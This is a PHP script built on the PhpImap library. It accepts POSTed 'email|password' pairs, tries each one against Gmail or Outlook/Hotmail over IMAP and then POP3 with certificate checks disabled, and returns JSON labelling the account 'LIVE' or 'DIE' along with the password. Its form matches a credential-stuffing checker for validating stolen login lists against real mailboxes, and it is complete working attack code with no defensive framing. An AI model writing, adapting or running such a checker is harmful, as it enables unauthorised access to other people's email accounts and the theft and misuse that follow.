<?php
namespace PhpImap;
define("DIR", dirname(__FILE__));
require DIR . "/vendor/autoload.php";
$tmp = DIR . "/tmp";

$server = [
    "gmail" => [
        "pop3" => "{pop.gmail.com:995/pop3/ssl/novalidate-cert}INBOX",
        "imap" => "{imap.gmail.com:993/imap/ssl/novalidate-cert}INBOX",
    ],
    "outlook" => [
        "pop3" => "{outlook.office365.com:995/pop3/ssl/novalidate-cert}INBOX",
        "imap" => "{outlook.office365.com:993/imap/ssl/novalidate-cert}INBOX",
    ],
];

$data = trim(@$_POST['data']);
$response = [
    "status" => "UNKNOWN",
    "email" => "NULL",
    "password" => "NULL",
    "data" => "NOT VALID"
];
$explode = explode("|", $data);
if (count($explode) == 2) {
    $email = trim($explode[0]);
    $password = trim($explode[1]);
    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $response['email'] = $email;
        $response['password'] = $password;
        if (preg_match('/@gmail\.com$/', $email)) {
            // Gmail POP3
            try {
                $mailbox = new Mailbox(
                    $server['gmail']['imap'],
                    $email,
                    $password,
                    $tmp
                );
                $mailbox->searchMailbox();
                $response['status'] = "LIVE";
                $response['data'] = "Server: IMAP";
                $mailbox->disconnect();
            } catch (Exceptions\ConnectionException $ex) {
                // Gmail POP3
                try {
                    $mailbox = new Mailbox(
                        $server['gmail']['pop3'],
                        $email,
                        $password,
                        $tmp
                    );
                    $mailbox->searchMailbox();
                    $response['status'] = "LIVE";
                    $response['data'] = "Server: POP3";
                    $mailbox->disconnect();
                } catch (Exceptions\ConnectionException $ex) {
                    $response['status'] = "DIE";
                    $response['data'] = $ex;
                }
            }
        } elseif (preg_match('/@hotmail\.com$/', $email) || preg_match('/@outlook\.com$/', $email)) {
            // Outlook IMAP
            try {
                $mailbox = new Mailbox(
                    $server['outlook']['imap'],
                    $email,
                    $password,
                    $tmp
                );
                $mailbox->searchMailbox();
                $response['status'] = "LIVE";
                $response['data'] = "Server: IMAP";
                $mailbox->disconnect();
            } catch (Exceptions\ConnectionException $ex) {
                // Outlook POP3
                try {
                    $mailbox = new Mailbox(
                        $server['outlook']['pop3'],
                        $email,
                        $password,
                        $tmp
                    );
                    $mailbox->searchMailbox();
                    $response['status'] = "LIVE";
                    $response['data'] = "Server: POP3";
                    $mailbox->disconnect();
                } catch (Exceptions\ConnectionException $ex) {
                    $response['status'] = "DIE";
                    $response['data'] = $ex;
                }
            }
        }
    }
}

header("Content-Type: application/json");
die(json_encode($response, 64|128|256));